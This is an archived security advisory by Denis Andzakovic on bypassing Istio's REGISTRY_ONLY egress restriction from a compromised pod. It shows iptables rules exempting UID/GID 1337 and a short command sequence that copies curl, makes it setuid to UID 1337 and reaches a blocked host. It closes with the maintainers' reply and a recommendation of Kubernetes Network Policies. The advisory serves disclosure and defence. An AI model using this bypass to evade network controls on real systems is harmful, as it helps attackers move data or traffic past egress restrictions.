---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-08-15_istio-outboundtrafficpolicy-egress-control-bypass.md
original_filename: 2023-08-15_istio-outboundtrafficpolicy-egress-control-bypass.md
title: Istio outboundTrafficPolicy Egress Control Bypass
category: documents
detected_topics:
- xss
- sso
- command-injection
- clickjacking
- api-security
tags:
- imported
- documents
- xss
- sso
- command-injection
- clickjacking
- api-security
language: en
raw_sha256: a9854ea3d45e8eac986bac2cfb40fae935ee7839fb02cb7657309e460c18f647
text_sha256: db54939943d068f216aee3afdf0fd0cfaab252d36fd8b7b45fc01074956c8983
ingested_at: '2026-06-28T07:32:25Z'
sensitivity: unknown
redactions_applied: false
---

# Istio outboundTrafficPolicy Egress Control Bypass

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-08-15_istio-outboundtrafficpolicy-egress-control-bypass.md
- Source Type: markdown
- Detected Topics: xss, sso, command-injection, clickjacking, api-security
- Ingested At: 2026-06-28T07:32:25Z
- Redactions Applied: False
- Raw SHA256: `a9854ea3d45e8eac986bac2cfb40fae935ee7839fb02cb7657309e460c18f647`
- Text SHA256: `db54939943d068f216aee3afdf0fd0cfaab252d36fd8b7b45fc01074956c8983`


## Content

---
title: "Istio outboundTrafficPolicy Egress Control Bypass"
url: "https://pulsesecurity.co.nz/advisories/istio-egress-bypass"
final_url: "https://pulsesecurity.co.nz/advisories/istio-egress-bypass"
authors: ["Denis Andzakovic"]
programs: ["Istio"]
bugs: ["Kubernetes"]
publication_date: "2023-08-15"
added_date: "2023-08-21"
source: "pentester.land/writeups.json"
original_index: 854
---

# Istio outboundTrafficPolicy Egress Control Bypass

by Denis Andzakovic

### Recent Releases

####  advisories [See all](/advisories)

  * 12/6/24  [CodiMD Unauthorised Image Access](/advisories/codimd-missing-image-access-controls)
  * 5/6/24  [Slack Web Hook Message Injection Advisory](/advisories/slack-message-injection)
  * 18/3/24  [Bypassing USBGuard on Linux](/advisories/usbguard-bypass)
  * 20/9/23  [HDF5 - Multiple Memory Corruption Vulnerabilities](/advisories/hdf5-memory-corruption)

* * *

####  articles [See all](/articles)

  * 26/5/26  [Stealing Browser Sessions with DevTools](/articles/stealing_browser_sessions_with_devtools)
  * 22/5/26  [Timeboxed Penetration Testing - Pulse Security’s Approach](/articles/timeboxed-penetration-tests)
  * 13/2/26  [Harvesting Intune Device Scripts Without Tools](/articles/intune-device-scripts)
  * 14/1/26  [Sensitive data in URLs: Why private links aren’t private anymore due to threat intelligence feeds](/articles/unguessable_url_issues)

Aug 15 2023

Istio can be used to control egress traffic from Istio enabled Kubernetes workloads. When combined with the `meshConfig.outboundTrafficPolicy.mode=REGISTRY_ONLY` flag, this can be an attractive option for restricting what outbound connections a pod can make. An attacker who has compromised an Istio enabled pod configured in this way, and can set their processes user ID to `1337`, can bypass the egress control.

This advisory is a bit of an interesting one disclosure wise. After finding this issue during an engagement and reproducing in a local test lab, I struggled to understand from the Istio documentation whether or not this behaviour constituted a vulnerability. After contacting the Istio maintainers, they advised that Istio doesn’t support being used for egress restriction. In fact, one of the maintainers has [written a blog about it](https://blog.howardjohn.info/posts/bypass-egress/).

I wasn’t able to find an existing resource detailing the `setuid()` bypass. I’m hoping by detailing the practical exploitation here, we can better point folks implementing K8s systems in the right direction. The TLDR is: don’t rely on Istio for egress restriction, implement Kubernetes Network Policies instead.

# Background

Istio is a Kubernetes service mesh which (amongst other things) can help prevent pods from connecting to external services through the `meshConfig.outboundTrafficPolicy.mode` flag set to `REGISTRY_ONLY`. This requires any external resource that pods should be able to access to be configured as specific `ServiceEntry` objects, otherwise outbound traffic is prohibited.

This control works by redirecting traffic from the pod to the Istio egress gateway via an `iptables` `REDIRECT` rule. The `iptables` rules which enforce this traffic redirection can be bypassed by setting a process’s user ID to `1337` inside a pod.

The following figures shows the example test lab setup, which allowed connections only to `edition.cnn.com`.
  
  
  :~$ kubectl get configmap istio -n istio-system -o yaml
  apiVersion: v1
  data:
  mesh: |-
  ...omitted for brevity...
  outboundTrafficPolicy:
  mode: REGISTRY_ONLY
  rootNamespace: istio-system
  trustDomain: cluster.local
  meshNetworks: 'networks: {}'
  kind: ConfigMap
  metadata:
  ...omitted for brevity...
  :~$ kubectl get serviceentry -o wide
  NAME  HOSTS  LOCATION  RESOLUTION  AGE
  cnn  ["edition.cnn.com"]  DNS  16h
  

# setuid() egress filter bypass

Containers in the same Kubernetes pod share the same kernel namespaces. When using Istio, a sidecar container is deployed in the Istio enabled pod. Istio configures `iptables` rules in the pod’s network namespace to redirect traffic to the sidecar proxies, which then makes decisions on what-goes-where and implements Istio’s mutual TLS magick.

As all containers in a pod share the same namespaces, this means they share the same user-namespace as well. Per-pod user-namespace support in Kubernetes is a whole other topic, the main thing to remember is if you are `root` in `container A` within a pod, you are `root` in all other containers in that same pod. At least as far as the kernel’s `task_struct` is concerned. After compromising a pod, an attacker that can issue the `setuid()` syscall and set their `UID` or `GID` to `1337` can match an Istio `iptables` rule that bypasses the filter.

The following `iptables-save` output shows the vulnerable egress rule, allowing all connections outbound where `uid-owner` or `guid-owner` is set to `1337` (`-A ISTIO_OUTPUT -m owner --uid-owner 1337 -j RETURN`). The PID below belongs to the `envoy` proxy running in the Istio sidecar.
  
  
  $ sudo nsenter -t 6017 -a iptables-save
  *nat
  :PREROUTING ACCEPT [255:15300]
  :INPUT ACCEPT [255:15300]
  :OUTPUT ACCEPT [82:6879]
  :POSTROUTING ACCEPT [87:7179]
  :ISTIO_INBOUND - [0:0]
  :ISTIO_IN_REDIRECT - [0:0]
  :ISTIO_OUTPUT - [0:0]
  :ISTIO_REDIRECT - [0:0]
  -A PREROUTING -p tcp -j ISTIO_INBOUND
  -A OUTPUT -p tcp -j ISTIO_OUTPUT
  -A ISTIO_INBOUND -p tcp -m tcp --dport 15008 -j RETURN
  -A ISTIO_INBOUND -p tcp -m tcp --dport 15090 -j RETURN
  -A ISTIO_INBOUND -p tcp -m tcp --dport 15021 -j RETURN
  -A ISTIO_INBOUND -p tcp -m tcp --dport 15020 -j RETURN
  -A ISTIO_INBOUND -p tcp -j ISTIO_IN_REDIRECT
  -A ISTIO_IN_REDIRECT -p tcp -j REDIRECT --to-ports 15006
  -A ISTIO_OUTPUT -s 127.0.0.6/32 -o lo -j RETURN
  -A ISTIO_OUTPUT ! -d 127.0.0.1/32 -o lo -p tcp -m tcp ! --dport 15008 -m owner --uid-owner 1337 -j ISTIO_IN_REDIRECT
  -A ISTIO_OUTPUT -o lo -m owner ! --uid-owner 1337 -j RETURN
  -A ISTIO_OUTPUT -m owner --uid-owner 1337 -j RETURN
  -A ISTIO_OUTPUT ! -d 127.0.0.1/32 -o lo -p tcp -m tcp ! --dport 15008 -m owner --gid-owner 1337 -j ISTIO_IN_REDIRECT
  -A ISTIO_OUTPUT -o lo -m owner ! --gid-owner 1337 -j RETURN
  -A ISTIO_OUTPUT -m owner --gid-owner 1337 -j RETURN
  -A ISTIO_OUTPUT -d 127.0.0.1/32 -j RETURN
  -A ISTIO_OUTPUT -j ISTIO_REDIRECT
  -A ISTIO_REDIRECT -p tcp -j REDIRECT --to-ports 15001
  COMMIT
  

The vulnerable rules are:
  
  
  -A ISTIO_OUTPUT -m owner --gid-owner 1337 -j RETURN
  -A ISTIO_OUTPUT -m owner --uid-owner 1337 -j RETURN
  

The `xt_owner` net-filter module implements the rules above and uses the `fsuid` and `fsgid` objects associated with the open socket file descriptor to determine the owner of the connection (https://github.com/torvalds/linux/blob/master/net/netfilter/xt_owner.c#L87). Remember how containers in a pod share the same namespaces? An attacker who has root user access in a pod can use `setuid()` to switch to a UID which matches the iptables rules highlighted above and bypasses the restriction. The following figure details a simple bypass where setuid bit is used to force `cURL` to run as `UID` `1337`:
  
  
  root@test1:/# curl -i google.com
  HTTP/1.1 502 Bad Gateway
  date: Wed, 09 Aug 2023 01:46:39 GMT
  server: envoy
  content-length: 0
  
  root@test1:/# cp /usr/bin/curl /usr/bin/curl-setuid
  root@test1:/# chown 1337 /usr/bin/curl-setuid 
  root@test1:/# chmod +s /usr/bin/curl-setuid 
  root@test1:/# curl-setuid -i google.com
  HTTP/1.1 301 Moved Permanently
  Location: http://www.google.com/
  Content-Type: text/html; charset=UTF-8
  Content-Security-Policy-Report-Only: object-src 'none';base-uri 'self';script-src 'nonce-FyXPCyDFyG56W5w9rgnHqQ' 'strict-dynamic' 'report-sample' 'unsafe-eval' 'unsafe-inline' https: http:;report-uri https://csp.withgoogle.com/csp/gws/other-hp
  Date: Wed, 09 Aug 2023 01:47:08 GMT
  Expires: Fri, 08 Sep 2023 01:47:08 GMT
  Cache-Control: public, max-age=2592000
  Server: gws
  Content-Length: 219
  X-XSS-Protection: 0
  X-Frame-Options: SAMEORIGIN
  
  <HTML><HEAD><meta http-equiv="content-type" content="text/html;charset=utf-8">
  <TITLE>301 Moved</TITLE></HEAD><BODY>
  <H1>301 Moved</H1>
  The document has moved
  <A HREF="http://www.google.com/">here</A>.
  </BODY></HTML>
  

# Testing Setup

Istio was installed with `istioctl install --set profile=demo --set meshConfig.outboundTrafficPolicy.mode=REGISTRY_ONLY`. The following YAML file was used to set up the service entry:
  
  
  apiVersion: networking.istio.io/v1alpha3
  kind: ServiceEntry
  metadata:
  name: ubuntu
  spec:
  hosts:
  - 'edition.cnn.com'
  ports:
  - number: 80
  name: http-port
  protocol: HTTP
  - number: 443
  name: https
  protocol: HTTPS
  resolution: NONE
  

# Summary

Istio’s `meshConfig.outboundTrafficPolicy.mode=REGISTRY_ONLY` is not an appropriate security control for restricting egress traffic. Hardening containers to reduce the likelihood of a compromise giving an attacker `root` privileges would help mitigate this issue; however, other edge-cases such as UDP traffic avoiding filtering all together exist (see the References below). The Istio maintainers themselves don’t consider the `meshConfig.outboundTrafficPolicy.mode=REGISTRY_ONLY` option a robust security control, so we shouldn’t either. Here is their verbatim response:

> Thanks for the report. This is working as expected and documented: https://istio.io/latest/docs/ops/best-practices/security/#understand-traffic-capture-limitations.

Check out [Kubernetes Network Policies](https://kubernetes.io/docs/concepts/services-networking/network-policies/) for a better network filtering option. While you’re at it, limiting traffic from pods to internal Kubernetes infrastructure and other Kubernetes workloads is a good defense measure for preventing lateral movement. Maybe we’ll talk a little more about this in the future. In the mean time, here is the Kubernetes security guidance: <https://kubernetes.io/docs/concepts/security/security-checklist/#network-security>

# Timeline

11/08/2023 - Advisory sent to Istio  
12/08/2023 - Response from Istio  
15/08/2023 - Advisory released, documentation feedback sent to Istio

# References

  * <https://istio.io>
  * <https://istio.io/latest/docs/ops/best-practices/security/#understand-traffic-capture-limitations>
  * <https://blog.howardjohn.info/posts/bypass-egress/>
  * <https://github.com/DSecurity/istio-security-restrictions-bypass>
  * <https://kubernetes.io/docs/concepts/security/security-checklist/#network-security>

* * *

_Follow us on[LinkedIn](https://nz.linkedin.com/company/pulsesecurity)_

* * *
